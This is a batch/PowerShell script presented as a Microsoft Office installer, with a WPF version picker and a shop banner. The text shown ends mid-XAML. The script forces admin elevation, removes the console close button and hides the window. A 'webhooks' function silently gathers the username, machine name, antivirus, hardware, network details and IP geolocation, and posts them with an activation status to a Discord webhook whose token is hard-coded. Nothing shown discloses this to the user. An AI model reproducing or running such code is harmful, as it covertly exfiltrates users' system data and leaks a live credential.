<# ::
@echo off
title // MICROSOFT OFFICE INSTALLER - INDOJAVA ONLINE - HINZDC X SARGA
mode con cols=90 lines=30
color 0B

:Begin UAC check and Auto-Elevate Permissions
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
echo:
echo:
echo                 Requesting Administrative Privileges...
echo:
echo                 ENABLING ADMINISTRATOR RIGHTS...
echo                 Press YES in UAC Prompt to Continue
echo.
echo		 	     Please Wait...
echo:

    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

cls

powershell -c "iex ((Get-Content '%~f0') -join [Environment]::Newline); iex 'main %*'"
goto :eof

#>
#-----------------------------------------------------------------------------------------
<#
    Name            : Microsoft Office Installer tools
    Version         : 1.0
    Script by       : Leo Nguyen
    Script Modified : Olih x SARGA
    Source          : https://github.com/bonguides25/PowerShell/blob/main/MSOffice/install.ps1
    Description     : This script is used to install Microsoft Office 365, 2024, 2021, 2019, 2016 and 2013 Office products.

    Version History:
    1.0, 2025-02-28 - Added Office 2025, 2024, 2021, 2019, 2016 and 2013 installation options.
#>

Add-Type -AssemblyName PresentationFramework, System.Drawing, PresentationFramework, System.Windows.Forms, WindowsFormsIntegration, PresentationCore
[System.Windows.Forms.Application]::EnableVisualStyles()
$Host.UI.RawUI.WindowTitle = '// Aurora ToolKIT Consol Log // - INDOJAVA ONLINE - HINZDC X SARGA'
$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(90, 30)
$Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(90, 30)

#-----------------------------------------------------------------------------------------
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class ConsoleControl {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

    [DllImport("user32.dll")]
    public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern int GetSystemMenu(IntPtr hWnd, bool bRevert);

    [DllImport("user32.dll")]
    public static extern bool RemoveMenu(int hMenu, int uPosition, int uFlags);
}
"@

# Mendapatkan handle jendela konsol saat ini
$consoleHandle = [ConsoleControl]::GetConsoleWindow()

# Mengatur constant untuk mengubah properti jendela konsol
$GWL_STYLE = -16
$WS_MAXIMIZEBOX = 0x10000
$WS_SIZEBOX = 0x40000

# Mengambil style jendela saat ini
$currentStyle = [ConsoleControl]::GetWindowLong($consoleHandle, $GWL_STYLE)

# Menghapus kemampuan untuk diubah ukurannya, dimaksimalkan dan menutup jendela
$newStyle = $currentStyle -band -bnot $WS_SIZEBOX -band -bnot $WS_MAXIMIZEBOX

# Menerapkan style baru ke jendela
[ConsoleControl]::SetWindowLong($consoleHandle, $GWL_STYLE, $newStyle) > $null

# Menyembunyikan jendela jika sudah dimodifikasi (untuk memastikan tidak ada kesalahan)
[ConsoleControl]::ShowWindow($consoleHandle, 5) > $null  # 5 = SW_SHOW

# Menghapus menu sistem (termasuk tombol Close/X)
$hMenu = [ConsoleControl]::GetSystemMenu($consoleHandle, $false)
[ConsoleControl]::RemoveMenu($hMenu, 0xF060, 0x0) > $null  # 0xF060 = SC_CLOSE (tombol Close)

function UnQuickEdit
{
	$t=[AppDomain]::CurrentDomain.DefineDynamicAssembly((Get-Random), 1).DefineDynamicModule((Get-Random), $False).DefineType((Get-Random))
	$t.DefinePInvokeMethod('GetStdHandle', 'kernel32.dll', 22, 1, [IntPtr], @([Int32]), 1, 3).SetImplementationFlags(128)
	$t.DefinePInvokeMethod('SetConsoleMode', 'kernel32.dll', 22, 1, [Boolean], @([IntPtr], [Int32]), 1, 3).SetImplementationFlags(128)
	$t.DefinePInvokeMethod('GetConsoleWindow', 'kernel32.dll', 22, 1, [IntPtr], @(), 1, 3).SetImplementationFlags(128)
	$t.DefinePInvokeMethod('SendMessageW', 'user32.dll', 22, 1, [IntPtr], @([IntPtr], [UInt32], [IntPtr], [IntPtr]), 1, 3).SetImplementationFlags(128)
	$k=$t.CreateType()
	if ($winbuild -GE 17763) {
		if ($k::SendMessageW($k::GetConsoleWindow(), 127, 0, 0) -EQ [IntPtr]::Zero) {
			return
		}
	}
	$v=(0x0080, 0x00A0)[!($winbuild -GE 10586)]
	$b=$k::SetConsoleMode($k::GetStdHandle(-10), $v)
}
UnQuickEdit
#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------
function webhooks {
    $date = (Get-Date)
    $os = Get-CimInstance -ClassName Win32_OperatingSystem
    $osVersion = "$($os.Caption) ($($os.OSArchitecture))"
    $winversion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisplayVersion
        if (-not $winversion) {
            $winversion = $null
        }

    $username = $env:USERNAME
    $compName = $env:COMPUTERNAME
    $language = (Get-Culture).Name

    # Ambil antivirus yang terinstall
    $antivirus = (Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct).displayName -join ", "
    if (-not $antivirus) { $antivirus = "Not installed" }

    # Ambil informasi CPU, GPU, RAM
    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
    $Manufacturer = $computerSystem.Vendor
    $Type = $computerSystem.Version
    $Model = $computerSystem.Name

    $cpu = (Get-CimInstance Win32_Processor)
    $Name = $cpu.Name
    $Cores = $cpu.NumberOfCores
    $LogicalProcessors = $cpu.NumberOfLogicalProcessors
    $gpu = (Get-CimInstance Win32_VideoController).Name
    $ramInfo = Get-WmiObject Win32_PhysicalMemory
    $totalSizeInGB = 0
    $ramDetails = @()
    foreach ($ram in $ramInfo) {
        $sizeInGB = [math]::Round($ram.Capacity / 1GB, 2)
        $totalSizeInGB += $sizeInGB
        $ramDetails += "$($ram.Manufacturer) $sizeInGB GB ($($ram.Speed) MHz)"
    }
    $TotalSizeInGB = $totalSizeInGB
    $Modules = $ramDetails -join " -- "

    $disks = Get-CimInstance -ClassName Win32_DiskDrive
    $diskall = ""
    foreach ($disk in $disks) {
        $modeldisk = $disk.Model
        $sizeInGB = [math]::round($disk.Size / 1GB, 2)
        $diskall += "- $modeldisk - $sizeInGB GB`n"
    }
    $diskall | Out-Null

    # Ambil status baterai
    $battery = (Get-CimInstance Win32_Battery)
    $batteryStatus = if ($battery) { "$($battery.EstimatedChargeRemaining)%" } else { "NoSystemBattery" }

    # Ambil resolusi layar
    Add-Type -AssemblyName System.Windows.Forms
    $resolution = "{0}x{1}" -f [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

    # Ambil informasi jaringan
    $gatewayIP = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq "0.0.0.0/0" } | Select-Object -ExpandProperty NextHop)
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress
    $ip = Invoke-RestMethod -Uri "http://ip-api.com/json/"

    $wifi = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match 'Wireless' -and $_.Status -eq 'Up' }
    if ($wifi) {
        $wifiName = (Get-NetConnectionProfile -InterfaceAlias $wifi.Name).Name
    } else {
        $wifiName = "No Wi-Fi connected."
    }
    $lanAdapter = Get-NetAdapter | Where-Object { $_.MediaConnectionState -eq 'Connected' -and $_.InterfaceDescription -notmatch 'Wireless' }
    if ($lanAdapter) {
        $lanStatus = "LAN connected.: $($lanAdapter.Name)"
        $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -ErrorAction SilentlyContinue
        if ($pingResult.StatusCode -eq 0) {
            $internetStatus = "Internet via LAN connected."
        } else {
            $internetStatus = "Internet via LAN is not connected."
        }
    } else {
        $lanStatus = "No LAN connected."
        $internetStatus = "Internet via LAN is not available."
    }

    $WifiName = $wifiName
    $LanStatus = $lanStatus
    $InternetStatus = $internetStatus

    # URL Webhook Discord
    $webhookid = "1370237685767209070"
    $webhooktoken = "3a9GapUT5gNGgao8wKUDcKznmjx2hQ4gs1s0dkYAOoFomWAVM_--Y7iZCd13_cb4BK8v"
    $webhookUrl = "https://discord.com/api/webhooks/$webhookid/$webhooktoken"

    # URL Gambar dan Thumbnail
    #$imageUrl = "https://.../preview.png"
    #$thumbnailUrl = "https://.../preview.png"

    # Buat payload JSON dengan format embed lengkap
    $payload = @{
        username = "AuroraBot"
        #avatar_url = ""
        embeds = @(@{
            title = ":fox: AuroraToolKIT - System Report"
            description = ":key: **Microsoft Office Installer**"
            color = 3447003
            fields = @(
                @{ name = ""; value = ":calendar: $date`n"; inline = $false },
                @{ name = ":computer: **SYSTEM**"; value = "**System:** $osVersion`n**Windows Version:** $winversion`n**Username:** $username`n**CompName:** $compName`n**Language:** $language`n**Antivirus:** $antivirus `n`n"; inline = $false },
                @{ name = ":desktop: **HARDWARE**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Name) ($($Cores) Core, $($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n$diskall`n"; inline = $false },
                @{ name = ":globe_with_meridians: **NETWORK**"; value = "**SSID:** $WifiName`n**LAN:**n$LanStatus`n**Internet Status:** $InsternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)"; inline = $false },
                @{ name = ""; value = "-----------------------------------------------"; inline = $false },
                @{ name = "**:green_circle: ACTIVATION STATUS**"; value = " `n`n$(CheckOhook)`n"; inline = $false }
                
            )
            #thumbnail = @{ url = $thumbnailUrl }
            #image = @{ url = $imageUrl }
            footer = @{ text = "AuroraBot | PowerShell Script" }
            timestamp = Get-Date -Format o
        })
    } | ConvertTo-Json -Depth 10

    # Kirim ke Discord Webhook
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
}
#-----------------------------------------------------------------------------------------
[Console]::OutputEncoding = [System.Text.Encoding]::utf8
Clear-Host
# ASCII Art dalam Unicode [char]
$text = @"

                                                  $([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2557)
         $([char]0x2554)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2563) ISTANA BEC LANTAI 1 BLOK D7 $([char]0x2551)
         $([char]0x2551)                                        $([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2563)
         $([char]0x2551)   $([char]0x2588)$([char]0x2588)                                $([char]0x2588)$([char]0x2588)                               $([char]0x2551)
         $([char]0x2551)   $([char]0x2591)$([char]0x2591) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2592)$([char]0x2592) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2584)$([char]0x2580) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)      $([char]0x2591)$([char]0x2591) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)     $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)   $([char]0x2551)
         $([char]0x2551)   $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)      $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)     $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)   $([char]0x2551)
         $([char]0x2551)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2580)$([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)$([char]0x2580) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)   $([char]0x2551)
         $([char]0x2551)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2580)$([char]0x2584) $([char]0x2592)$([char]0x2592)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)    $([char]0x2580)$([char]0x2588)$([char]0x2580)    $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)   $([char]0x2551)
         $([char]0x2551)                                                                      $([char]0x2551)
         $([char]0x255A)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x255D)
                          ----- MICROSOFT OFFICE INSTALLER -----
"@

Write-Host $text -ForegroundColor Cyan

Write-Host
Write-Host "------------------------------------------------------------------------------------------"
Write-Host "   SERVICE - SPAREPART - UPGRADE - MAINTENANCE - INSTALL ULANG - JUAL - TROUBLESHOOTING   "
Write-Host "------------------------------------------------------------------------------------------"
Write-Host
Write-Host "  > AURORA TOOLKIT" -ForegroundColor Yellow
Write-Host "  > Version 1.0" -ForegroundColor Yellow
Write-Host "  > Created by: Olih x SARGA" -ForegroundColor Yellow
#----------------------------------------------
Write-Host
Write-Host " Launch Microsoft Office Installer Tool" -NoNewline
for ($i = 0; $i -lt 10; $i++) {
    Write-Host -NoNewline "."; Start-Sleep -Milliseconds 300
}
Write-Host


$WinAPI = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
"@ -Name "WinAPI" -Namespace "API" -PassThru

$hwnd = $WinAPI::GetConsoleWindow()

# Sembunyikan jendela
$WinAPI::ShowWindow($hwnd, 0) | Out-Null


$xamlinput = @'
<Window x:Class="OfficeInstaller.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:OfficeInstaller"
        mc:Ignorable="d"
        MaxWidth="1150"
        MaxHeight="550"
        MinWidth="1150"
        MinHeight="515"
        Title="Microsoft Installation Tool // INDOJAVA ONLINE - HINZDC X SARGA // ISTANA BEC BANDUNG" Height="515" Width="1150" WindowStartupLocation="CenterScreen" Icon="https://raw.githubusercontent.com/hinzdc/get/refs/heads/main/image/Microsoft.png">

    <Window.Resources>
        <!-- Style dasar -->
        <Style x:Key="BaseRoundedButtonStyle" TargetType="Button">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border Background="{TemplateBinding Background}" 
                                BorderBrush="{TemplateBinding BorderBrush}" 
                                BorderThickness="1" CornerRadius="3">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Setter Property="FontFamily" Value="Consolas"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="UseLayoutRounding" Value="True"/>
            <Setter Property="BorderBrush" Value="Transparent"/>
            <!-- Default Border -->

            <!-- Efek Hover Universal -->
            <Style.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter Property="Opacity" Value="0.8"/>
                </Trigger>
            </Style.Triggers>
        </Style>

        <!-- Style Hijau -->
        <Style x:Key="GreenButtonStyle" BasedOn="{StaticResource BaseRoundedButtonStyle}" TargetType="Button">
            <Setter Property="Background" Value="#FF168E12"/>
        </Style>

        <!-- Style Oranye -->
        <Style x:Key="OrangeButtonStyle" BasedOn="{StaticResource BaseRoundedButtonStyle}" TargetType="Button">
            <Setter Property="Background" Value="#FFE23B15"/>
        </Style>

        <!-- Style Merah -->
        <Style x:Key="RedButtonStyle" BasedOn="{StaticResource BaseRoundedButtonStyle}" TargetType="Button">
            <Setter Property="Background" Value="#FFE23B15"/>
        </Style>
        
        <!-- Style Grey -->
        <Style x:Key="GreyButtonStyle" BasedOn="{StaticResource BaseRoundedButtonStyle}" TargetType="Button">
            <Setter Property="Background" Value="#808080"/>
        </Style>

        <!-- Style untuk ToolTip -->
        <Style TargetType="ToolTip">
            <Setter Property="Background" Value="#2D2D30"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="FontSize" Value="11"/>
            <Setter Property="Padding" Value="10"/>
            <Setter Property="BorderBrush" Value="Gray"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="Effect">
                <Setter.Value>
                    <DropShadowEffect BlurRadius="10" Color="Black" ShadowDepth="2"/>
                </Setter.Value>
            </Setter>
        </Style>

        <Storyboard x:Key="BlinkTextAnimation" RepeatBehavior="Forever">
            <ColorAnimation Storyboard.TargetProperty="(TextBox.Foreground).(SolidColorBrush.Color)"
                        From="Black" To="Transparent" Duration="0:0:2" AutoReverse="True"/>
        </Storyboard>

        <!-- Style untuk TextBox Berkedip -->
        <Style x:Key="BlinkingTextBoxStyle" TargetType="TextBox">
            <Setter Property="Foreground">
                <Setter.Value>
                    <SolidColorBrush Color="Red"/>
                    <!-- Warna awal -->
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <EventTrigger RoutedEvent="TextBox.Loaded">
                    <BeginStoryboard Storyboard="{StaticResource BlinkTextAnimation}"/>
                </EventTrigger>
            </Style.Triggers>
        </Style>
        <Storyboard x:Key="RotateStoryboard">
            <DoubleAnimation 
                Storyboard.TargetProperty="(UIElement.RenderTransform).(RotateTransform.Angle)"
                From="0" To="360" Duration="0:0:5" RepeatBehavior="Forever" />
        </Storyboard>
    </Window.Resources>


    <Grid HorizontalAlignment="Left" VerticalAlignment="Top">
        <GroupBox x:Name="groupBoxMicrosoftOffice" Header="Select version to install:" BorderBrush="#FF164A69" Margin="125,10,0,0" HorizontalAlignment="Left" VerticalAlignment="Top" Height="458" Width="1000" FontFamily="Consolas" FontSize="11">
            <Canvas HorizontalAlignment="Left" VerticalAlignment="Top">
                <Rectangle Height="81" Stroke="#FF164A69" Width="135" UseLayoutRounding="True" RadiusX="5" RadiusY="5" Canvas.Left="11" Canvas.Top="20" HorizontalAlignment="Center" VerticalAlignment="Top"/>
                <Label x:Name="Label365" Content="Microsoft 365" FontWeight="Bold" Canvas.Left="19" Background="#FFDA2323" HorizontalAlignment="Center" VerticalAlignment="Top" Canvas.Top="8" Foreground="White" Padding="8,4,8,4"/>
                <RadioButton x:Name="radioButton365Home" Content="Home" Canvas.Left="19" Canvas.Top="35" HorizontalAlignment="Left" VerticalAlignment="Top" VerticalContentAlignment="Center" Margin="0,5,0,0"/>
                <RadioButton x:Name="radioButton365Business" Content="Business" Canvas.Left="19" Canvas.Top="54" HorizontalAlignment="Left" VerticalAlignment="Center" HorizontalContentAlignment="Center" VerticalContentAlignment="Center" Margin="0,5,0,0"/>
                <RadioButton x:Name="radioButton365Enterprise" Content="Enterprise" Canvas.Left="19" Canvas.Top="73" HorizontalAlignment="Left" VerticalAlignment="Top" VerticalContentAlignment="Center" Margin="0,5,0,0"/>
                <Rectangle Height="306" Stroke="#FF164A69" Width="150" UseLayoutRounding="True" RadiusX="5" RadiusY="5" Canvas.Left="162" Canvas.Top="20" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024Pro" Content="Professional Plus" VerticalContentAlignment="Center" Canvas.Left="179" Canvas.Top="40" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024Std" Content="Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="55" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024ProjectPro" Content="Project Pro" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="74" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024ProjectStd" Content="Project Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="92" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024VisioPro" Content="Visio Pro" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="112" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024VisioStd" Content="Visio Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="132" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024Word" Content="Word" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="152" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024Excel" Content="Excel" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="172" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024PowerPoint" Content="PowerPoint" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="192" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024Outlook" Content="Outlook" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="212" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024Access" Content="Access" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="232" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024Publisher" Content="Publisher" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="252" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024HomeStudent" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="272" Content="HomeStudent" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2024HomeBusiness" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="179" Canvas.Top="295" Content="HomeBusiness" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <Label x:Name="Label2024" Content="Office 2024" FontWeight="Bold" Canvas.Left="170" Canvas.Top="8" Foreground="White" UseLayoutRounding="True" Padding="8,4,8,4" ScrollViewer.CanContentScroll="True" Background="#CC6000" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <Rectangle Height="306" Stroke="#FF164A69" Width="150" UseLayoutRounding="True" RadiusX="5" RadiusY="5" Canvas.Left="326" Canvas.Top="20" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <Label x:Name="Label2021" Content="Office 2021" FontWeight="Bold" Canvas.Left="334" Canvas.Top="8" HorizontalAlignment="Left" VerticalAlignment="Center" Foreground="White" UseLayoutRounding="True" Padding="8,4,8,4" ScrollViewer.CanContentScroll="True" Background="#FF3C10DE"/>
                <RadioButton x:Name="radioButton2021Pro" Content="Professional Plus" VerticalContentAlignment="Center" HorizontalAlignment="Left" VerticalAlignment="Center" Canvas.Left="342" Canvas.Top="40"/>
                <RadioButton x:Name="radioButton2021Std" Content="Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="55" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2021ProjectPro" Content="Project Pro" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="74" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2021ProjectStd" Content="Project Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="92" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2021VisioPro" Content="Visio Pro" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="112" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2021VisioStd" Content="Visio Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="132" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2021Word" Content="Word" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="152" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2021Excel" Content="Excel" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="172" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2021PowerPoint" Content="PowerPoint" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="192" HorizontalAlignment="Left" VerticalAlignment="Center"/>
